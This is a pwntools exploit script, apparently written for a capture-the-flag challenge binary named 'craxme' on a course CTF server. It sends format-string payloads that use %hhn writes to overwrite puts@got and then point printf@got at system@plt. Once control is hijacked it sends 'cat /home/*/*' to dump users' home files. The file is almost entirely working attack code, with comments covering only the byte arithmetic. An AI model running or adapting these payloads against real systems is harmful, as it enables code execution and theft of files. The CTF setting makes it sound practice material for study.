from pwn import *
from pwnlib import *
import libformatstr
from libformatstr import FormatStr

context.arch='amd64'
context.bits=64
magic_address = 0x60106c

'''
0c 12
b0 176 164
ce 206 30
fa 250 44
'''

puts_got_address = 0x601018
printf_got_address = 0x601030

if __name__ == '__main__':
    if args.args['REMOTE']:
        p = connect('csie.ctf.tw', 10134)
    else:
        p = process('./craxme-2da5957de53a93b4bc9ffb4e46c8bf287df0376c')

    # overwrite puts@got -> 0x400747
    '''
    0x400747
    47  71
    07  7   256-64  192
    40  64          57
    00      256-64  192
    '''
    payload = '%71c%16$hhn%192c%17$hhn%57c%18$hhn%192c%19$hhn%20$hhn%21$hhn%22$hhn%23$hhn00000\x00'
    for i in range(8):
        payload = payload + p64(puts_got_address + i)
    print payload
    p.send(payload)
    p.clean(0.1)
    # write whatever i want
    # overwrite printf@plt -> system@plt

    '''
    0x4005a0 system@plt
    a0  160 -14         146
    05  5   -155+256    101
    40  64              59
    00      -64+256     192
    '''

    gdb.attach(p, '''
    b *0x400779
    b *0x400765
    c
    ''')
    payload = '%160c%17$hhn%101c%18$hhn%59c%19$hhn%192c%20$hhn%21$hhn%22$hhn%23$hhn%24$hhn0000\x00'
    for i in range(8):
        payload = payload + p64(printf_got_address + i)
    p.send(payload)
    p.clean(0.1)
    time.sleep(0.5)
    p.send('cat /home/*/*\x00')
    raw_input()
    print p.recvall()
